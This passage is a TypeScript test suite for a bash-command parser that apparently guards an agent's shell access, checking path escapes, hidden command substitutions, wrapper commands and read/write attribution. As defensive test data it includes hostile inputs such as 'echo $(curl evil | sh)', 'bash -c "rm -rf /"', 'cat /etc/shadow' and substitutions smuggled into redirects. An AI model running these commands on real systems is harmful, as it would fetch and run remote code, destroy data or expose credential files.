        const program = await BashProgram.parse(
          "cd a/b && pnpm x 2>&1 | tail ; cd .. && cd ..",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("does not fold the terminal piped command of the first stage", async () => {
        // Fail-closed: `cd b` is the terminal command of the first stage, i.e.
        // the real pipe stage (a subshell), so it must NOT fold. With the
        // correct base cwd/a, ../../x escapes to /projects/x. If `cd b` were
        // wrongly folded, the base would be cwd/a/b and ../../x would stay
        // inside — a fail-open regression this test pins.
        const program = await BashProgram.parse(
          "cd a && cd b 2>&1 | tail ; cat ../../x",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/x");
      });

      it("resolves a downstream pipe stage against the folded base", async () => {
        // The stage after the `|` runs in a subshell that inherits the folded
        // cwd/a, so ../foo resolves inside cwd rather than escaping against the
        // pre-cd base.
        const program = await BashProgram.parse(
          "cd a && pnpm x 2>&1 | cat ../foo",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });
    });

    it("flags an absolute in-cwd path that resolves externally via a symlink, returning the typed form", async () => {
      // The strict classifier only processes absolute tokens, so the escape
      // surface is `cat /cwd/link/hosts` (absolute) where `link -> /etc`.
      // The boundary decision still uses the canonical form (so the path is
      // flagged), but the returned value is the typed/lexical form so config
      // patterns match the path as the user wrote it (#418).
      realpathSync.mockImplementation((p: string) => {
        if (p === "/projects/my-app/link/hosts") return "/etc/hosts";
        return p;
      });
      const program = await BashProgram.parse(
        "cat /projects/my-app/link/hosts",
        normalizer,
      );
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
      expect(external).toContain("/projects/my-app/link/hosts");
      expect(external).not.toContain("/etc/hosts");
    });

    it("does not flag a token that resolves within a symlinked cwd", async () => {
      // Simulates /tmp -> /private/tmp on macOS; cwd is the canonical form.
      const symlinkCwd = "/private/tmp";
      realpathSync.mockImplementation((p: string) => {
        if (p === "/tmp") return "/private/tmp";
        if (p.startsWith("/tmp/")) return `/private/tmp${p.slice(4)}`;
        return p;
      });
      const program = await BashProgram.parse(
        "cat /tmp/workspace/file.ts",
        new PathNormalizer(pathFlavorForPlatform(process.platform), symlinkCwd),
      );
      expect(program.externalAccesses()).toHaveLength(0);
    });
  });

  describe("commands", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    it("returns a single-element list for a lone command", async () => {
      const program = await BashProgram.parse("npm install pkg", normalizer);
      expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
    });

    it("splits an && chain", async () => {
      const program = await BashProgram.parse("cd /p && npm i x", normalizer);
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "npm i x" },
      ]);
    });

    it("splits || , ; and & separators", async () => {
      expect(
        (await BashProgram.parse("a || b", normalizer)).commands(),
      ).toEqual([{ text: "a" }, { text: "b" }]);
      expect((await BashProgram.parse("a ; b", normalizer)).commands()).toEqual(
        [{ text: "a" }, { text: "b" }],
      );
      expect((await BashProgram.parse("a & b", normalizer)).commands()).toEqual(
        [{ text: "a" }, { text: "b" }],
      );
    });

    it("splits a pipeline into its commands", async () => {
      const program = await BashProgram.parse("cat f | grep b", normalizer);
      expect(program.commands()).toEqual([
        { text: "cat f" },
        { text: "grep b" },
      ]);
    });

    it("splits newline-separated commands", async () => {
      const program = await BashProgram.parse("foo\nbar", normalizer);
      expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
    });

    it("does not split operators inside quotes", async () => {
      const program = await BashProgram.parse("echo 'x && y'", normalizer);
      expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
    });

    it("captures the command of a redirected statement without the redirect", async () => {
      const program = await BashProgram.parse(
        "npm install > out.txt",
        normalizer,
      );
      expect(program.commands()).toEqual([{ text: "npm install" }]);
    });

    describe("commands hosted in a redirect target (#741)", () => {
      it.each([
        ["echo hi > $(rm x)", "echo hi", "rm x"],
        ["echo hi >> $(rm b)", "echo hi", "rm b"],
        ["echo hi 2> `rm d`", "echo hi", "rm d"],
        ["echo hi &> $(rm q)", "echo hi", "rm q"],
      ])("descends into %s", async (command, enclosing, inner) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text: enclosing },
          { text: inner, context: "command_substitution" },
        ]);
      });

      it("descends into a process substitution read as input", async () => {
        const program = await BashProgram.parse("cat < <(rm c)", normalizer);
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm c", context: "process_substitution" },
        ]);
      });

      it("descends into a substitution concatenated into the destination", async () => {
        const program = await BashProgram.parse(
          "echo hi > ${DIR}/$(rm z)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "echo hi" },
          { text: "rm z", context: "command_substitution" },
        ]);
      });

      it("descends into a redirect on a chained command", async () => {
        const program = await BashProgram.parse(
          "cd /p && echo hi > $(rm x)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cd /p" },
          { text: "echo hi" },
          { text: "rm x", context: "command_substitution" },
        ]);
      });

      it("leaves a plain redirect destination unenumerated", async () => {
        const program = await BashProgram.parse(
          "echo hi > out.txt",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "echo hi" }]);
      });
    });

    describe("commands hosted in a heredoc body (#741)", () => {
      it("descends into an interpolating heredoc body", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF\n$(rm e)\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm e", context: "command_substitution" },
        ]);
      });

      it.each([
        ["single-quoted", "cat <<'EOF'\n$(rm e)\nEOF"],
        ["double-quoted", 'cat <<"EOF"\n$(rm e)\nEOF'],
      ])(
        "leaves a %s heredoc body literal, since it does not interpolate",
        async (_label, command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: "cat" }]);
        },
      );

      it("descends into a herestring substitution", async () => {
        const program = await BashProgram.parse("cat <<< $(rm x)", normalizer);
        expect(program.commands()).toEqual([
          { text: "cat <<< $(rm x)" },
          { text: "rm x", context: "command_substitution" },
        ]);
      });

      it("leaves a heredoc body carrying no substitution unenumerated", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF\nplain text\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "cat" }]);
      });
    });

    describe("commands hosted by a declaration, test, or assignment (#742)", () => {
      it.each([
        ["local x=$(rm y)", "rm y"],
        ["export X=$(rm x)", "rm x"],
        ["declare x=$(rm y)", "rm y"],
        ["readonly Y=$(rm z)", "rm z"],
        ["typeset q=$(rm w)", "rm w"],
        ["[[ $(rm x) ]]", "rm x"],
        ["[ $(rm x) ]", "rm x"],
        ["unset $(rm x)", "rm x"],
        ["X=$(rm q)", "rm q"],
        ["X=`rm q`", "rm q"],
      ])("descends into %s", async (command, inner) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text: command },
          { text: inner, context: "command_substitution" },
        ]);
      });

      it("descends into a process substitution hosted by a declaration", async () => {
        const program = await BashProgram.parse("local f=<(rm y)", normalizer);
        expect(program.commands()).toEqual([
          { text: "local f=<(rm y)" },
          { text: "rm y", context: "process_substitution" },
        ]);
      });

      it("leaves a declaration hosting no execution alone", async () => {
        const program = await BashProgram.parse("local x=1", normalizer);
        expect(program.commands()).toEqual([{ text: "local x=1" }]);
      });
    });

    describe("an unparsed ERROR node (#742)", () => {
      it.each([
        [
          "an unterminated heredoc, whose body re-parses as garbage",
          "cat <<'EOF'\nsee `rm -rf x` here",
          "cat",
          "<<'EOF'\nsee `rm -rf x` here",
        ],
        ["an unbalanced quote", 'echo "$(rm x)', "echo", '"$(rm x)'],
      ])(
        "emits %s whole, taking nothing from inside it",
        async (_label, command, enclosing, blob) => {
          // Tree-sitter's error recovery *invents* structure, so a node type
          // inside an ERROR subtree is not evidence that a command runs.
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            { text: enclosing },
            { text: blob },
          ]);
        },
      );

      it("emits an unterminated control-flow statement whole", async () => {
        const program = await BashProgram.parse(
          "for f in a; do rm $f",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "for f in a; do rm $f" }]);
      });
    });

    describe("commands inside a for loop (#742)", () => {
      it("emits the body's commands, but not the loop variable or word list", async () => {
        // `f`, `a`, and `b` are operand words, not commands: emitting them
        // would name `a` as the offending *command* in a prompt.
        const program = await BashProgram.parse(
          "for f in a b; do rm $f; done",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in a b; do rm $f; done" },
          { text: "rm $f" },
        ]);
      });

      it("emits every command of a multi-statement body", async () => {
        const program = await BashProgram.parse(
          "for f in a; do cd /t && rm $f; done",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in a; do cd /t && rm $f; done" },
          { text: "cd /t" },
          { text: "rm $f" },
        ]);
      });

      it("descends into a substitution in the word list", async () => {
        const program = await BashProgram.parse(
          "for f in $(rm x); do echo $f; done",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in $(rm x); do echo $f; done" },
          { text: "rm x", context: "command_substitution" },
          { text: "echo $f" },
        ]);
      });
    });

    describe("commands inside the remaining compound statements (#742)", () => {
      // Each row is written as a real parse of the construct rather than as an
      // assertion about a node-type set, because the node-type names are
      // external facts about the tree-sitter-bash grammar: `select` parses as
      // `for_statement` and `until` as `while_statement`, and a typo in a set
      // fails invisibly.
      it.each([
        ["if true; then rm y; fi", ["true", "rm y"]],
        [
          "if true; then rm y; elif false; then rm z; else rm w; fi",
          ["true", "rm y", "false", "rm z", "rm w"],
        ],
        ["while true; do rm y; done", ["true", "rm y"]],
        ["until true; do rm y; done", ["true", "rm y"]],
        ["select f in a b; do rm $f; done", ["rm $f"]],
        ["for ((i=0; i<3; i++)); do rm $i; done", ["i=0", "rm $i"]],
        ["case /etc/shadow in a) rm y;; b) rm z;; esac", ["rm y", "rm z"]],
        ["myfn() { rm y; }", ["{ rm y; }", "rm y"]],
        ["function myfn { rm y; }", ["{ rm y; }", "rm y"]],
        ["{ rm y; }", ["rm y"]],
        ["! rm y", ["rm y"]],
      ])("descends into %s", async (command, inner) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text: command },
          ...inner.map((text) => ({ text })),
        ]);
      });

      it("leaves a case subject and its patterns unemitted", async () => {
        // `/etc/shadow` and `a` are operand words, not commands.
        const program = await BashProgram.parse(
          "case /etc/shadow in a) rm y;; esac",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "case /etc/shadow in a) rm y;; esac" },
          { text: "rm y" },
        ]);
      });

      it("leaves a function's own name unemitted", async () => {
        const program = await BashProgram.parse(
          "deploy() { rm y; }",
          normalizer,
        );
        expect(program.commands().map((unit) => unit.text)).not.toContain(
          "deploy",
        );
      });

      it("descends into a substitution in condition position", async () => {
        const program = await BashProgram.parse(
          "if $(rm x); then echo a; fi",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "if $(rm x); then echo a; fi" },
          { text: "$(rm x)" },
          { text: "rm x", context: "command_substitution" },
          { text: "echo a" },
        ]);
      });

      it("relays the enclosing execution context to a compound's commands", async () => {
        const program = await BashProgram.parse(
          "( if true; then rm y; fi )",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "( if true; then rm y; fi )" },
          { text: "if true; then rm y; fi", context: "subshell" },
          { text: "true", context: "subshell" },
          { text: "rm y", context: "subshell" },
        ]);
      });
    });

    it("descends into command substitution, tagging the inner command", async () => {
      const program = await BashProgram.parse("echo $(rm -rf foo)", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ]);
    });

    it("descends into backtick command substitution", async () => {
      const program = await BashProgram.parse("echo `rm x`", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo `rm x`" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("descends into a pipeline inside command substitution", async () => {
      const program = await BashProgram.parse(
        "echo $(curl evil | sh)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "echo $(curl evil | sh)" },
        { text: "curl evil", context: "command_substitution" },
        { text: "sh", context: "command_substitution" },
      ]);
    });

    it("descends into process substitution", async () => {
      const program = await BashProgram.parse(
        "diff <(cat /etc/shadow)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "diff <(cat /etc/shadow)" },
        { text: "cat /etc/shadow", context: "process_substitution" },
      ]);
    });

    it("emits a bare subshell whole and descends into it", async () => {
      const program = await BashProgram.parse("( rm -rf foo )", normalizer);
      expect(program.commands()).toEqual([
        { text: "( rm -rf foo )" },
        { text: "rm -rf foo", context: "subshell" },
      ]);
    });

    it("emits a subshell whole and descends into its chain", async () => {
      const program = await BashProgram.parse("( cd /t && rm x )", normalizer);
      expect(program.commands()).toEqual([
        { text: "( cd /t && rm x )" },
        { text: "cd /t", context: "subshell" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends recursively through nested contexts", async () => {
      const program = await BashProgram.parse("echo $( ( rm x ) )", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $( ( rm x ) )" },
        { text: "( rm x )", context: "command_substitution" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends into a substitution within a chained command", async () => {
      const program = await BashProgram.parse(
        "cd /p && echo $(rm x)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "echo $(rm x)" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("keeps the never-weaker invariant: a benign inner command stays", async () => {
      const program = await BashProgram.parse("echo $(echo safe)", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $(echo safe)" },
        { text: "echo safe", context: "command_substitution" },
      ]);
    });

    it("returns an empty list for an empty or whitespace command", async () => {
      expect((await BashProgram.parse("", normalizer)).commands()).toEqual([]);
      expect((await BashProgram.parse("   ", normalizer)).commands()).toEqual(
        [],
      );
    });

    it("strips a leading env-var assignment prefix", async () => {
      const program = await BashProgram.parse(
        "AWS_PROFILE=prod aws ec2 terminate-instances --instance-ids i-1",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "aws ec2 terminate-instances --instance-ids i-1" },
      ]);
    });

    it("strips multiple leading env-var assignments", async () => {
      const program = await BashProgram.parse("A=1 B=2 aws s3 ls", normalizer);
      expect(program.commands()).toEqual([{ text: "aws s3 ls" }]);
    });

    it("strips the env-var prefix of each command in a chain", async () => {
      const program = await BashProgram.parse(
        "X=1 aws sts get-caller-identity && ls",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "aws sts get-caller-identity" },
        { text: "ls" },
      ]);
    });

    it("keeps a pure assignment with no command unchanged", async () => {
      const program = await BashProgram.parse("FOO=bar", normalizer);
      expect(program.commands()).toEqual([{ text: "FOO=bar" }]);
    });

    describe("opaque-payload wrappers", () => {
      it.each([
        ['bash -c "rm -rf /"', 'bash -c "rm -rf /"'],
        ['sh -c "rm -rf /"', 'sh -c "rm -rf /"'],
        ['dash -c "rm -rf /"', 'dash -c "rm -rf /"'],
        ['zsh -c "rm -rf /"', 'zsh -c "rm -rf /"'],
        ['ksh -c "rm -rf /"', 'ksh -c "rm -rf /"'],
        ['eval "rm -rf /"', 'eval "rm -rf /"'],
        ['/bin/bash -c "rm -rf /"', '/bin/bash -c "rm -rf /"'],
        ['bash -ec "rm -rf /"', 'bash -ec "rm -rf /"'],
      ])("flags %s as opaque", async (command, text) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text, wrapperKind: "opaque-payload", executedUnit: "rm -rf /" },
        ]);
      });

      it("flags an env-prefixed wrapper as opaque after stripping the prefix", async () => {
        const program = await BashProgram.parse(
          'AWS_PROFILE=prod bash -c "rm -rf /"',
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: 'bash -c "rm -rf /"',
            wrapperKind: "opaque-payload",
            executedUnit: "rm -rf /",
          },
        ]);
      });

      it.each(["bash script.sh", "bash", "ls -la", "grep -c foo file"])(
        "does not flag %s as opaque",
        async (command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: command }]);
        },
      );
    });

    describe("indirection wrappers", () => {
      it.each([
        ["sudo aws s3 ls", "sudo aws s3 ls", "aws s3 ls"],
        ["env FOO=bar aws s3 ls", "env FOO=bar aws s3 ls", "aws s3 ls"],
        ["xargs rm -rf", "xargs rm -rf", "rm -rf"],
        ["time aws s3 ls", "time aws s3 ls", "aws s3 ls"],
        ["nohup aws s3 ls", "nohup aws s3 ls", "aws s3 ls"],
        ["timeout 10 aws s3 ls", "timeout 10 aws s3 ls", "aws s3 ls"],
        ["nice -n 10 aws s3 ls", "nice -n 10 aws s3 ls", "aws s3 ls"],
        ["/usr/bin/sudo aws s3 ls", "/usr/bin/sudo aws s3 ls", "aws s3 ls"],
        // Exec-capable rewrites and prefix wrappers (#575).
        ["parallel rm ::: x", "parallel rm ::: x", "rm ::: x"],
        ["doas aws s3 ls", "doas aws s3 ls", "aws s3 ls"],
        ["setsid aws s3 ls", "setsid aws s3 ls", "aws s3 ls"],
        ["stdbuf -oL aws s3 ls", "stdbuf -oL aws s3 ls", "aws s3 ls"],
        ["flock /tmp/lock aws s3 ls", "flock /tmp/lock aws s3 ls", "aws s3 ls"],
      ])(
        "flags %s as an indirection wrapper",
        async (command, text, executedUnit) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            { text, wrapperKind: "indirection", executedUnit },
          ]);
        },
      );

      // The remaining #575 wrappers, whose realistic inner commands are core
      // readers, so the unit also carries the floor exemption (#803).
      it.each([
        ["rust-parallel echo", "echo"],
        ["rush echo", "echo"],
        ["watch ls", "ls"],
      ])(
        "flags %s as an indirection wrapper running a pure reader",
        async (command, executedUnit) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            {
              text: command,
              wrapperKind: "indirection",
              executedUnit,
              floorExemption: "core-reader",
            },
          ]);
        },
      );

      it("flags an env-prefixed indirection wrapper after stripping the prefix", async () => {
        const program = await BashProgram.parse(
          "AWS_PROFILE=prod sudo aws s3 ls",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "sudo aws s3 ls",
            wrapperKind: "indirection",
            executedUnit: "aws s3 ls",
          },
        ]);
      });

      it.each(["aws s3 ls", "ls -la", "grep -n foo file"])(
        "does not flag %s as an indirection wrapper",
        async (command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: command }]);
        },
      );
    });

    describe("exec-conditional wrappers (find/fd)", () => {
      it.each([
        ["find . -exec rm {} \\;", "rm {}"],
        ["find . -execdir rm {} \\;", "rm {}"],
        ["find . -ok rm {} \\;", "rm {}"],
        ["find . -okdir rm {} \\;", "rm {}"],
        ["fd -x rm", "rm"],
        ["fd --exec rm", "rm"],
        ["fd -X rm", "rm"],
        ["fd --exec-batch rm", "rm"],
      ])(
        "flags %s as an indirection wrapper",
        async (command, executedUnit) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            { text: command, wrapperKind: "indirection", executedUnit },
          ]);
        },
      );

      it.each(["find . -name foo", "fd pattern", "fd -H -t f pattern"])(
        "does not flag a bare %s search",
        async (command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: command }]);
        },
      );
    });

    describe("executed unit", () => {
      it.each([
        ['bash -c "rm -rf /"', "rm -rf /"],
        ["sudo aws s3 rm", "aws s3 rm"],
        ["sudo -u root aws s3 rm", "aws s3 rm"],
        ["timeout 10 grep foo", "grep foo"],
        ["find . -name x -exec grep foo {} \\;", "grep foo {}"],
        ["sudo timeout 5 xargs grep foo", "grep foo"],
      ])("names what %s actually runs", async (command, executedUnit) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()[0].executedUnit).toBe(executedUnit);
      });

      it("is absent for an ordinary command", async () => {
        const program = await BashProgram.parse("grep foo", normalizer);
        expect(program.commands()).toEqual([{ text: "grep foo" }]);
      });

      it("is absent when the wrapper names no inner command", async () => {
        const program = await BashProgram.parse("xargs", normalizer);
        expect(program.commands()).toEqual([
          { text: "xargs", wrapperKind: "indirection" },
        ]);
      });
    });

    describe("floor exemption", () => {
      /** The exemption recorded for each unit of a parsed command. */
      async function exemptions(
        command: string,
      ): Promise<(string | undefined)[]> {
        const program = await BashProgram.parse(command, normalizer);
        return program.commands().map((unit) => unit.floorExemption);
      }

      it.each([
        "xargs grep foo",
        "xargs -0 rg pattern",
        "find . -name '*.ts' -exec wc -l {} +",
        "sudo timeout 5 xargs grep foo",
      ])("exempts %s", async (command) => {
        await expect(exemptions(command)).resolves.toEqual(["core-reader"]);
      });

      it.each([
        ["xargs pnpm test", "the inner command is not in the core"],
        ["xargs -I{} sh -c 'grep -l x {}'", "the payload is not re-parsed"],
        ["find . -exec sh -c 'grep x' \\;", "the payload is not re-parsed"],
        ["xargs sort -o /tmp/x", "`-o` withdraws sort's read claim"],
      ])("does not exempt %s (%s)", async (command) => {
        await expect(exemptions(command)).resolves.toEqual([undefined]);
      });

      it("is absent for a command that is not a wrapper", async () => {
        await expect(exemptions("grep foo")).resolves.toEqual([undefined]);
      });

      describe("a statement that writes through a redirect", () => {
        it("withholds the exemption from the redirected wrapper", async () => {
          await expect(exemptions("xargs grep foo > out.txt")).resolves.toEqual(
            [undefined],
          );
        });

        it.each([">>", ">|", "&>"])(
          "withholds it for a %s redirect too",
          async (operator) => {
            await expect(
              exemptions(`xargs grep foo ${operator} out.txt`),
            ).resolves.toEqual([undefined]);
          },
        );

        it("withholds it from every unit of a redirected pipeline", async () => {
          // The redirect applies to the last element, but it hangs off the whole
          // pipeline in the parse tree. Over-attributing is the fail-closed
          // direction: the flag can only ever withhold an exemption.
          await expect(
            exemptions("cat a | xargs grep b > out"),
          ).resolves.toEqual([undefined, undefined]);
        });

        it("withholds it from a redirected subshell's commands", async () => {
          await expect(exemptions("( xargs grep foo ) > out")).resolves.toEqual(
            [undefined, undefined],
          );
        });

        it("withholds it from a redirected compound statement's commands", async () => {
          // A compound statement's body runs in the current shell, so the
          // enclosing statement's write reaches every unit beneath it — the
          // scope is relayed unchanged rather than restarted (#742).
          await expect(
            exemptions("if true; then xargs grep -l x; fi > out.txt"),
          ).resolves.toEqual([undefined, undefined, undefined]);
        });

        it.each([
          ["xargs grep foo > $OUT", "an unquoted variable"],
          ["xargs grep foo >${OUT}", "a brace expansion"],
          ["xargs grep foo > ${DIR}/log", "an expansion plus a literal"],
        ])(
          "withholds it for a destination named by %s (%s)",
          async (command) => {
            // The destination is chosen at run time, so the parse cannot say
            // which file it is — and it is invisible to the path projection too
            // (#609), which makes the floor the only guard that ever covered it.
            await expect(exemptions(command)).resolves.toEqual([undefined]);
          },
        );

        it("withholds it for a command-substitution destination", async () => {
          // Two units: the wrapper, and the `mktemp` hosted in the destination.
          await expect(
            exemptions("xargs grep foo > $(mktemp)"),
          ).resolves.toEqual([undefined, undefined]);
        });
      });

      describe("a redirect that writes no file", () => {
        it("keeps the exemption for a descriptor duplication", async () => {
          await expect(exemptions("xargs grep foo 2>&1")).resolves.toEqual([
            "core-reader",
          ]);
        });

        it("keeps the exemption for an input redirect", async () => {
          await expect(exemptions("xargs grep foo < in.txt")).resolves.toEqual([
            "core-reader",
          ]);
        });
      });

      it("gives a nested execution its own scope", async () => {
        // The redirect belongs to the enclosing statement, not to the command
        // substitution hosted in its destination.
        await expect(
          exemptions("echo hi > $(xargs grep foo)"),
        ).resolves.toEqual([undefined, "core-reader"]);
      });
    });
  });

  it("derives both slices from a single parse", async () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );
    const program = await BashProgram.parse("cat .env /etc/hosts", normalizer);
    expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
      ".env",
      "/etc/hosts",
    ]);
    const external = program.externalAccesses().map(({ path }) => path.value());
    expect(external).toContain("/etc/hosts");
    expect(external).not.toContain(".env");
  });

  describe("workdir seed (#574)", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("flags an absolute workdir outside cwd as an external path", async () => {
      const program = await BashProgram.parse("echo hi", normalizer, {
        workdir: "/etc",
      });
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toContain("/etc");
    });

    it("resolves a relative token against the workdir base", async () => {
      const program = await BashProgram.parse("cat ../secret.txt", normalizer, {
        workdir: "/etc",
      });
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
      // ../secret.txt resolves against /etc, not cwd.
      expect(external).toContain("/secret.txt");
      expect(external).toContain("/etc");
    });

    it("keeps an absolute token base-independent under a workdir", async () => {
      const program = await BashProgram.parse(
        "cat /var/log/syslog",
        normalizer,
        { workdir: "/etc" },
      );
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
      expect(external).toContain("/var/log/syslog");
      expect(external).not.toContain("/etc/var/log/syslog");
    });

    it("does not flag a workdir inside cwd, and resolves relative tokens under it", async () => {
      const program = await BashProgram.parse("cat ../secret.txt", normalizer, {
        workdir: "sub",
      });
      // ../secret.txt from cwd/sub resolves back to cwd/secret.txt (internal),
      // and the workdir sub is inside cwd — nothing is external.
      expect(program.externalAccesses()).toEqual([]);
    });

    it("resolves a relative path-rule candidate against the workdir base", async () => {
      const program = await BashProgram.parse("cat sub/file.txt", normalizer, {
        workdir: "/work",
      });
      const candidate = program
        .pathRuleCandidates()
        .find(({ token }) => token === "sub/file.txt");
      expect(candidate?.path.matchValues()).toContain("/work/sub/file.txt");
    });

    it("reproduces cwd-based resolution when no workdir is given", async () => {
      const program = await BashProgram.parse("cat ../secret.txt", normalizer);
      // ../secret.txt from cwd resolves against the parent of cwd.
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toContain("/projects/secret.txt");
    });

    it("applies Git Bash drive-mount semantics to a win32 workdir", async () => {
      const win = new PathNormalizer(win32PathFlavor, "C:\\projects\\app");
      const program = await BashProgram.parse("echo hi", win, {
        workdir: "/c/work",
      });
      // /c/work is the MSYS mount for C:\work — outside the cwd, so flagged.
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
      expect(external.some((v) => v.toLowerCase().includes("work"))).toBe(true);
    });

    it("attributes nothing to the seeded workdir itself", async () => {
      const program = await BashProgram.parse("echo hi", normalizer, {
        workdir: "/etc",
      });
      const workdirEntry = program
        .externalAccesses()
        .find(({ path }) => path.value() === "/etc");
      expect(workdirEntry?.effect).toEqual(UNPROVEN_EFFECT);
    });
  });

  describe("effect attribution (#807)", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("carries a core word's read onto its external access", async () => {
      const program = await BashProgram.parse("cat /etc/hosts", normalizer);
      expect(
        program.externalAccesses().map(({ path, effect }) => ({
          path: path.value(),
          effect,
        })),
      ).toEqual([
        { path: "/etc/hosts", effect: { effect: "read", source: "core" } },
      ]);
    });

    it("carries a core word's read onto its rule candidate", async () => {
      const program = await BashProgram.parse("cat /etc/hosts", normalizer);
      expect(
        program.pathRuleCandidates().map(({ token, effect }) => ({
          token,
          effect,
        })),
      ).toEqual([
        { token: "/etc/hosts", effect: { effect: "read", source: "core" } },
      ]);
    });

    it("carries a redirect's write onto its destination", async () => {
      const program = await BashProgram.parse(
        "cat /etc/hosts > /tmp/out.txt",
        normalizer,
      );
      expect(
        program.pathRuleCandidates().map(({ token, effect }) => ({
          token,
          effect,
        })),
      ).toEqual([
        { token: "/etc/hosts", effect: { effect: "read", source: "core" } },
        {
          token: "/tmp/out.txt",
          effect: { effect: "write", source: "syntax" },
        },
      ]);
    });

    it("proves nothing for a token a non-core command owns", async () => {
      const program = await BashProgram.parse("rm -rf /tmp/gone", normalizer);
      const candidate = program
        .pathRuleCandidates()
        .find(({ token }) => token === "/tmp/gone");
      expect(candidate?.effect).toEqual(UNPROVEN_EFFECT);
    });

    describe("two attributions of one resolved path", () => {
      it("folds to a single external access", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts > /etc/hosts",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(1);
      });

      it("falls to unproven when the two proofs disagree", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts > /etc/hosts",
          normalizer,
        );
        expect(program.externalAccesses()[0].effect).toEqual(UNPROVEN_EFFECT);
        expect(program.pathRuleCandidates()).toHaveLength(1);
        expect(program.pathRuleCandidates()[0].effect).toEqual(UNPROVEN_EFFECT);
      });

      it("keeps the effect when the two proofs agree", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts && head /etc/hosts",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(1);
        expect(program.externalAccesses()[0].effect).toEqual({
          effect: "read",
          source: "core",
        });
      });
    });
  });
});
